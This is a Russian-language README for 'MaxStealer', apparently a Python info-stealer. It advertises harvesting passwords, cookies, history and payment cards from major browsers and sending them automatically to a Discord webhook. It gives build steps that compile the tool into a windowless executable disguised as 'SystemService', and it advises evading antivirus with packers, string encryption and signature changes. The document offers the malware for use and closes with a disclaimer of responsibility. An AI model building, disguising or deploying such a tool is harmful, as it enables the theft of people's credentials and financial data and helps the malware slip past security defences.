# <img src="https://i.imgur.com/9E8pXbW.png" width=40> MaxStealer

> Профессиональный инструмент для сбора данных браузеров с необнаруживаемой работой

[![Version](https://img.shields.io/badge/version-1.37-purple)]()
[![Python](https://img.shields.io/badge/python-3.8%2B-blue)]()
[![License](https://img.shields.io/badge/license-NDA-red)]()

## ✨ Особенности
- Сбор паролей, куки, истории и платежных данных
- Поддержка всех популярных браузеров
- Автоматическая отправка в Discord
- Полностью скрытный режим работы
- Защита от детектирования антивирусами
- Автоочистка следов

## 🌐 Поддерживаемые браузеры
| Браузер | Пароли | Куки | Карты | История |
|---------|--------|------|-------|---------|
| Chrome  | ✔️     | ✔️   | ✔️    | ✔️      |
| Firefox | ✔️     | ✔️   | ✖️    | ✔️      |
| Edge    | ✔️     | ✔️   | ✔️    | ✔️      |
| Opera   | ✔️     | ✔️   | ✔️    | ✔️      |
| Yandex  | ✔️     | ✔️   | ✖️    | ✔️      |

## ⚙️ Установка
# Установите Python 3.8+
```bash
python --version
```
2. Установите зависимости:

```bash

pip install pycryptodome browser_cookie3 requests
```
# 🛠 Компиляция в EXE
```bash
pip install pyinstaller
```
4. Скомпилируйте с настройками скрытности:
```bash
pyinstaller --onefile --noconsole --name SystemService --icon=NONE stealer.py
```
## ⚠️ Важные заметки

# Замените ваш_вебхук в коде на свой Discord Webhook URL

# Для обхода антивирусов используйте:

1. Упаковщики (VMProtect, Themida)

2. Шифрование строк

3. Смена сигнатур

Разработчик не несет ответственности за использование
